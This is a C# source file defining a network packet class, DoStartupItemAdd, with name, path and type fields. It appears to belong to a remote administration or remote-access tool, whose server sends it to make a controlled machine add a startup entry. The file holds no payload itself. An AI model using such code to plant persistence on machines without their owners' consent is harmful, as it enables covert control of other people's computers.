using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoStartupItemAdd : IPacket
{
	public string Name { get; set; }

	public string Path { get; set; }

	public int Type { get; set; }

	public DoStartupItemAdd()
	{
	}

	public DoStartupItemAdd(string name, string path, int type)
	{
		Name = name;
		Path = path;
		Type = type;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
